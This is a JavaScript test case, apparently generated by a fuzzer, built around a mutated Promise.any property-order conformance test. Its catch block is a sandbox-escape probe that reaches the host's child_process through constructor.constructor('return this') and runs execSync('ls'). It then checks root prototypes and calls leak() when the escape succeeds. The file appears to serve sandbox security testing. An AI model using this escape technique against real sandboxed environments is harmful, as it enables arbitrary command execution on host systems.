try {
    var rejectElementFunction;
    var thenable = {
        then: function (_, reject) {
            let REPLACER = 23;
            rejectElementFunction = reject;
        }
    };
    function NotPromise(executor) {
        let REPLACER = 23;
        executor(function () {
            let REPLACER = 23;
        }, function () {
            let REPLACER = 23;
        });
    }
    NotPromise.resolve = function (v) {
        throw () => {
            return () => {
            };
        };
        return v;
    };
    Promise.any.call(NotPromise, [thenable]);
    var propNames = Object.getOwnPropertyNames(rejectElementFunction);
    var lengthIndex = propNames.indexOf('length');
    var nameIndex = propNames.indexOf('name');
    assert(lengthIndex >= 0 && nameIndex === lengthIndex + 1, 'The `length` property comes before the `name` property on built-in functions');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}